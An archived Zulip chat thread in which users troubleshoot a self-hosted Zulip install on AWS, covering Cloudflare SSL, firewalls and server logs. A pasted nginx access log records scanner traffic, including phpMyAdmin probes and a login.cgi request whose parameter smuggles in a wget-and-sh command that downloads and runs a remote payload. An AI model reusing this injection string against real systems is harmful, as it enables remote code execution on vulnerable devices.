<html>
<head><meta charset="utf-8"><title>Selfhosting · production help · Zulip Chat Archive</title></head>
<h2>Stream: <a href="https://rht.github.io/czo-archive/stream/31-production-help/index.html">production help</a></h2>
<h3>Topic: <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html">Selfhosting</a></h3>

<hr>

<base href="https://chat.zulip.org">

<head><link href="https://rht.github.io/czo-archive/style.css" rel="stylesheet"></head>

<a name="619965"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/619965" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> syamkumar <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#619965">(Jul 28 2018 at 12:13)</a>:</h4>
<p>i am trying to self host zulip in production on an ec2 instance .  <br>
Using cloudflare to route the dns. do i need to enable certbot when cloudflare is providing ssl domain wide.</p>



<a name="620285"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/620285" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#620285">(Jul 28 2018 at 21:07)</a>:</h4>
<p><span class="user-mention" data-user-id="3806">@syamkumar</span> I believe you don't; the self-signed cert option should be good enough (in that I believe Cloudflare does not validate SSL at the origin, so it doesn't matter what certificate you have).  This server is behind CloudFlare, but I'm not sure exactly how CloudFlare does things, because this server does have an SSL cert for an alternate/legacy domain that it presents.</p>



<a name="620415"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/620415" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#620415">(Jul 29 2018 at 03:00)</a>:</h4>
<p>Attempting to navigate to the single-use realm creation link just hangs.</p>



<a name="620416"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/620416" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#620416">(Jul 29 2018 at 03:02)</a>:</h4>
<p>btw, I'm installing <code>Zulip 1.8.1</code> on 16.04 but getting stuck at Step 3 <a href="https://zulip.readthedocs.io/en/latest/production/install.html" target="_blank" title="https://zulip.readthedocs.io/en/latest/production/install.html">here</a></p>



<a name="620982"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/620982" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#620982">(Jul 30 2018 at 17:22)</a>:</h4>
<p><span class="user-mention" data-user-id="8967">@Javis Sullivan</span> do you have a corporate firewall that could be blocking web access to your Zulip server's IP address?</p>



<a name="620983"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/620983" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#620983">(Jul 30 2018 at 17:22)</a>:</h4>
<p>I suspect the issue here is a network connectivity problem to your server on port 443, if it's the browser that's hanging.</p>



<a name="622565"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/622565" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#622565">(Jul 31 2018 at 21:15)</a>:</h4>
<p><span class="user-mention" data-user-id="7">@Tim Abbott</span> the TLS port is opened</p>



<a name="622574"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/622574" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#622574">(Jul 31 2018 at 21:26)</a>:</h4>
<p>Are you sure your AWS security groups aren't blocking access?</p>



<a name="622608"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/622608" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#622608">(Jul 31 2018 at 22:10)</a>:</h4>
<p>I'm using a lightsail instance that uses a top level firewall. Currently I have 80, 443, and some other custom ports open</p>



<a name="622627"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/622627" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#622627">(Jul 31 2018 at 23:04)</a>:</h4>
<p>And what precisely is happening when you try to connect?  Just hanging?  This sounds very much like a network-layer thing; if it were a Zulip-layer thing, you'd be getting an error page.</p>



<a name="623000"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/623000" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#623000">(Aug 01 2018 at 15:42)</a>:</h4>
<p>I agree. I'm just at a loss debugging. So when I navigate to the realm creation link, the page just constantly loads without evidence of things slowly popping up on the page. It then shows the connection timeout page that firefox provides.</p>



<a name="623059"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/623059" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#623059">(Aug 01 2018 at 16:42)</a>:</h4>
<p>Well, you can check <code>/var/log/nginx/</code> to see if the request reached the HTTP server.</p>



<a name="623062"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/623062" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#623062">(Aug 01 2018 at 16:43)</a>:</h4>
<p>But <span class="user-mention" data-user-id="8967">@Javis Sullivan</span>, I've had a lot of past experiences with AWS blocking things, because they have several layers of firewall that could be involved (machine's firewall, security groups, VPC network policy, etc.).  You can try connecting with <code>curl</code> from the machine itself as well.</p>



<a name="623081"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/623081" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Rishi Gupta <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#623081">(Aug 01 2018 at 16:58)</a>:</h4>
<p><span class="user-mention" data-user-id="8967">@Javis Sullivan</span> we're also happy to help take a deeper dive via an enterprise support contract -- our basic package includes installation help, among other things. You can reach out at <a href="mailto:support@zulipchat.com" title="mailto:support@zulipchat.com">support@zulipchat.com</a> if that sounds like a direction of interest.</p>



<a name="623284"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/623284" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#623284">(Aug 01 2018 at 18:43)</a>:</h4>
<p>Thanks for all the help so far! I'll look at the nginx logs in a bit as well as attempt to connect to the site with w3m while logged into the server.</p>



<a name="625405"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625405" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625405">(Aug 04 2018 at 00:03)</a>:</h4>
<p>nginx/access.log</p>
<div class="codehilite"><pre><span></span>/var/log/nginx# less access.log
138.117.84.231 - - [03/Aug/2018:06:29:29 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;
176.58.97.181 - - [03/Aug/2018:07:04:05 +0000] &quot;GET / HTTP/1.0&quot; 301 194 &quot;-&quot; &quot;-&quot;
109.204.169.85 - - [03/Aug/2018:07:17:00 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;
159.192.220.106 - - [03/Aug/2018:07:18:54 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;
62.122.50.21 - - [03/Aug/2018:08:10:09 +0000] &quot;GET / HTTP/1.0&quot; 301 194 &quot;-&quot; &quot;-&quot;
167.99.101.32 - - [03/Aug/2018:08:26:12 +0000] &quot;GET /MyAdmin/scripts/setup.php HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/7.0 (compatible; MSIE 8.0; Windows Seven)&quot;
167.99.101.32 - - [03/Aug/2018:08:26:12 +0000] &quot;GET /phpMyAdmin/scripts/setup.php HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/7.0 (compatible; MSIE 8.0; Windows Seven)&quot;
167.99.101.32 - - [03/Aug/2018:08:26:12 +0000] &quot;GET /myadmin/scripts/setup.php HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/7.0 (compatible; MSIE 8.0; Windows Seven)&quot;
167.99.101.32 - - [03/Aug/2018:08:26:12 +0000] &quot;GET HTTP/1.1 HTTP/1.1&quot; 400 182 &quot;-&quot; &quot;-&quot;
167.99.101.32 - - [03/Aug/2018:08:26:12 +0000] &quot;GET /phpmyadmin/scripts/setup.php HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/7.0 (compatible; MSIE 8.0; Windows Seven)&quot;
167.99.101.32 - - [03/Aug/2018:08:26:12 +0000] &quot;GET /pma/scripts/setup.php HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/7.0 (compatible; MSIE 8.0; Windows Seven)&quot;
1.0.215.84 - - [03/Aug/2018:08:40:18 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&quot;
202.169.246.203 - - [03/Aug/2018:09:05:54 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&quot;
201.242.250.13 - - [03/Aug/2018:11:09:42 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;
41.233.0.68 - - [03/Aug/2018:11:43:55 +0000] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 182 &quot;-&quot; &quot;Hakai/2.0&quot;
176.36.17.204 - - [03/Aug/2018:12:48:25 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;
189.18.124.183 - - [03/Aug/2018:14:06:28 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;
177.68.126.36 - - [03/Aug/2018:15:19:52 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;
84.20.83.117 - - [03/Aug/2018:15:26:17 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&quot;
41.161.73.164 - - [03/Aug/2018:15:52:24 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0(iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46&quot;
188.136.175.169 - - [03/Aug/2018:15:53:42 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;
66.240.205.34 - - [03/Aug/2018:16:39:59 +0000] &quot;Gh0st\xAD\x00\x00\x00\xE0\x00\x00\x00x\x9CKS``\x98\xC3\xC0\xC0\xC0\x06\xC4\x8C@\xBCQ\x96\x81\x81\x09H\x07\xA7\x16\x95e&amp;\xA7*\x04$&amp;g+\x182\x94\xF6\xB000\xAC\xA8rc\x00\x01\x11\xA0\x82\x1F\x5C`&amp;\x83\xC7K7\x86\x19\xE5n\x0C9\x95n\x0C;\x84\x0F3\xAC\xE8sch\xA8^\xCF4&#39;J\x97\xA9\x82\xE30\xC3\x91h]&amp;\x90\xF8\xCE\x97S\xCBA4L?2=\xE1\xC4\x92\x86\x0B@\xF5`\x0CT\x1F\xAE\xAF]&quot; 400 182 &quot;-&quot; &quot;-&quot;
201.95.4.16 - - [03/Aug/2018:17:17:19 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;
193.13.91.190 - - [03/Aug/2018:17:45:54 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;
156.201.230.147 - - [03/Aug/2018:17:48:31 +0000] &quot;GET /login.cgi?cli=aa%20aa%27;wget%20http://46.166.185.42/e%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$ HTTP/1.1&quot; 400 182 &quot;-&quot; &quot;Hakai/2.0&quot;
201.42.222.81 - - [03/Aug/2018:20:31:36 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;
159.65.165.131 - - [03/Aug/2018:20:44:02 +0000] &quot;HEAD / HTTP/1.1&quot; 301 0 &quot;http://www.netcraft.com/survey/&quot; &quot;Mozilla/4.0 (compatible; Netcraft Web Server Survey)&quot;
122.102.25.98 - - [03/Aug/2018:20:47:54 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;
202.133.1.190 - - [03/Aug/2018:20:55:01 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&quot;
197.234.117.126 - - [03/Aug/2018:21:29:45 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&quot;
177.9.139.146 - - [03/Aug/2018:22:30:21 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7&quot;
92.242.236.205 - - [03/Aug/2018:22:51:51 +0000] &quot;GET / HTTP/1.0&quot; 301 194 &quot;-&quot; &quot;-&quot;
92.242.236.205 - - [03/Aug/2018:22:51:53 +0000] &quot;GET / HTTP/1.0&quot; 301 194 &quot;-&quot; &quot;-&quot;
154.58.195.167 - - [03/Aug/2018:22:58:44 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;
109.94.123.207 - - [03/Aug/2018:23:25:39 +0000] &quot;GET / HTTP/1.1&quot; 301 194 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36&quot;
151.61.23.82 - - [03/Aug/2018:23:50:20 +0000] &quot;GET / HTTP/1.0&quot; 301 194 &quot;-&quot; &quot;-&quot;
</pre></div>


<p>people trying to hack</p>



<a name="625406"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625406" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625406">(Aug 04 2018 at 00:04)</a>:</h4>
<p><code>nginx/error.log</code> is empty<br>
<code>zulip/analytics.log</code></p>
<div class="codehilite"><pre><span></span>tail -n30 analytics.log
2018-08-04 00:05:04,214 INFO     START active_users_audit:is_bot:day 2018-08-04 00:00:00+00:00
2018-08-04 00:05:04,218 INFO     active_users_audit:is_bot:day run pull_function (3ms/8r)
2018-08-04 00:05:04,220 INFO     active_users_audit:is_bot:day RealmCount aggregation (1ms/1r)
2018-08-04 00:05:04,221 INFO     active_users_audit:is_bot:day InstallationCount aggregation (0ms/1r)
2018-08-04 00:05:04,222 INFO     DONE active_users_audit:is_bot:day (8ms)
2018-08-04 00:05:04,223 INFO     START active_users_log:is_bot:day 2018-08-04 00:00:00+00:00
2018-08-04 00:05:04,225 INFO     active_users_log:is_bot:day InstallationCount aggregation (0ms/0r)
2018-08-04 00:05:04,226 INFO     DONE active_users_log:is_bot:day (2ms)
2018-08-04 00:05:04,227 INFO     START active_users:is_bot:day 2018-08-04 00:00:00+00:00
2018-08-04 00:05:04,230 INFO     active_users:is_bot:day run pull_function (1ms/1r)
2018-08-04 00:05:04,232 INFO     active_users:is_bot:day InstallationCount aggregation (1ms/1r)
2018-08-04 00:05:04,233 INFO     DONE active_users:is_bot:day (5ms)
2018-08-04 00:05:04,234 INFO     START 15day_actives::day 2018-08-04 00:00:00+00:00
2018-08-04 00:05:04,236 INFO     15day_actives::day run pull_function (0ms/0r)
2018-08-04 00:05:04,237 INFO     15day_actives::day RealmCount aggregation (0ms/0r)
2018-08-04 00:05:04,237 INFO     15day_actives::day InstallationCount aggregation (0ms/0r)
2018-08-04 00:05:04,238 INFO     DONE 15day_actives::day (4ms)
2018-08-04 00:05:04,239 INFO     START minutes_active::day 2018-08-04 00:00:00+00:00
2018-08-04 00:05:04,242 INFO     minutes_active::day run pull_function (1ms/0r)
2018-08-04 00:05:04,243 INFO     minutes_active::day RealmCount aggregation (0ms/0r)
2018-08-04 00:05:04,243 INFO     minutes_active::day InstallationCount aggregation (0ms/0r)
2018-08-04 00:05:04,244 INFO     DONE minutes_active::day (4ms)
2018-08-04 00:05:04,245 INFO     START invites_sent::day 2018-08-04 00:00:00+00:00
2018-08-04 00:05:04,247 INFO     invites_sent::day InstallationCount aggregation (0ms/0r)
2018-08-04 00:05:04,248 INFO     DONE invites_sent::day (2ms)
2018-08-04 00:05:04,251 INFO     START realm_active_humans::day 2018-08-04 00:00:00+00:00
2018-08-04 00:05:04,253 INFO     realm_active_humans::day run pull_function (0ms/0r)
2018-08-04 00:05:04,253 INFO     realm_active_humans::day InstallationCount aggregation (0ms/0r)
2018-08-04 00:05:04,254 INFO     DONE realm_active_humans::day (3ms)
2018-08-04 00:05:04,255 INFO     Finished updating analytics counts through 2018-08-04 00:00:00+00:00
</pre></div>



<a name="625414"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625414" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625414">(Aug 04 2018 at 00:13)</a>:</h4>
<p><code>zulip/server.log</code></p>
<div class="codehilite"><pre><span></span>2018-08-04 00:09:25.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:09:31.647 INFO [] Tornado   0.0% busy over the past 60.0 seconds
2018-08-04 00:09:36.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:09:42.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:09:48.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:09:54.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:10:00.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:10:05.649 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:10:11.647 INFO [] Tornado   0.0% busy over the past 60.0 seconds
2018-08-04 00:10:12.385 INFO [] Tornado removed 0 idle event queues owned by 0 users in 0.000s.  Now 0 active queues, 0 handlers, latest ID 0
2018-08-04 00:10:16.647 INFO [] Tornado   0.0% busy over the past 60.0 seconds
2018-08-04 00:10:21.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:10:26.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:10:32.647 INFO [] Tornado   0.0% busy over the past 60.0 seconds
2018-08-04 00:10:37.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:10:43.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:10:49.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:10:55.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
2018-08-04 00:11:01.648 INFO [] Tornado   0.0% busy over the past 59.0 seconds
</pre></div>



<a name="625417"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625417" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625417">(Aug 04 2018 at 00:13)</a>:</h4>
<p><span class="user-mention" data-user-id="8967">@Javis Sullivan</span> any public IP address on the Internet in a cloud hosting provider gets continuous hack attempts like that, generally targeted at PHP software.  It isn't a problem; those requests just get 404s.</p>



<a name="625418"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625418" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625418">(Aug 04 2018 at 00:13)</a>:</h4>
<p>(What is the problem you're trying to solve)</p>



<a name="625419"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625419" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625419">(Aug 04 2018 at 00:14)</a>:</h4>
<p>(If you're not running an out-of-date version of PHP My Admin on your Zulip server, you don't need to worry about it)</p>



<a name="625420"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625420" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625420">(Aug 04 2018 at 00:14)</a>:</h4>
<p><span class="user-mention" data-user-id="7">@Tim Abbott</span> yea I wasn't worried about it but it does confirm I can get traffic to my public ip</p>



<a name="625422"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625422" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Tim Abbott <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625422">(Aug 04 2018 at 00:15)</a>:</h4>
<p>I see; any luck with w3m?</p>



<a name="625423"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625423" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625423">(Aug 04 2018 at 00:15)</a>:</h4>
<p>Still getting connection timeout when going to the single-use realm creation url</p>



<a name="625425"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625425" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625425">(Aug 04 2018 at 00:16)</a>:</h4>
<p>about to try that now</p>



<a name="625426"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625426" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625426">(Aug 04 2018 at 00:16)</a>:</h4>
<p>before I start <code>tcpdumping</code> etc</p>



<a name="625428"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625428" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625428">(Aug 04 2018 at 00:20)</a>:</h4>
<p><span class="user-mention" data-user-id="7">@Tim Abbott</span> just hangs with <code>Opening socket...</code></p>



<a name="625429"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625429" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625429">(Aug 04 2018 at 00:21)</a>:</h4>
<p>gonna start going top down with AWS now I guess</p>



<a name="625430"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625430" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625430">(Aug 04 2018 at 00:21)</a>:</h4>
<p>I would imagine nginx would have had some errors in there somewhere</p>



<a name="625439"></a>
<h4><a href="https://chat.zulip.org#narrow/stream/31-production%20help/topic/Selfhosting/near/625439" class="zl"><img src="https://rht.github.io/czo-archive/assets/img/zulip.svg" alt="view this post on Zulip" style="width:20px;height:20px;"></a> Javis Sullivan <a href="https://rht.github.io/czo-archive/stream/31-production-help/topic/Selfhosting.html#625439">(Aug 04 2018 at 00:31)</a>:</h4>
<p><span class="user-mention" data-user-id="7">@Tim Abbott</span> just tried to <code>./manage.py testserver</code></p>
<div class="codehilite"><pre><span></span>./manage.py testserver
Creating test database for alias &#39;default&#39;...
Got an error creating the test database: permission denied to create database

